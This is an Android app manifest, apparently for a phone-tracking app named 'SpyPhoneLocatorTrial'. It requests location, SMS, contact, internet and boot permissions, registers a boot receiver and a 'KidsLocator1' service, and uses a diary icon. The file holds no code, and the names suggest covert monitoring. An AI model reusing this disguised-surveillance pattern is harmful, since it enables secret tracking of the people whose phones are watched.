<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.company3L.SpyPhoneLocatorTrial">
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <application android:icon="@drawable/diary" android:label="@string/app_name">
        <receiver android:name=".LocationReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <activity android:label="@string/app_name" android:name=".Features" android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.Login"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/app_name" android:name=".Registered" android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.Registered"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/app_name" android:name=".Main" android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/app_name" android:name=".Register" android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.Register"/>
            </intent-filter>
        </activity>
        <service android:name=".KidsLocator1"/>
    </application>
</manifest>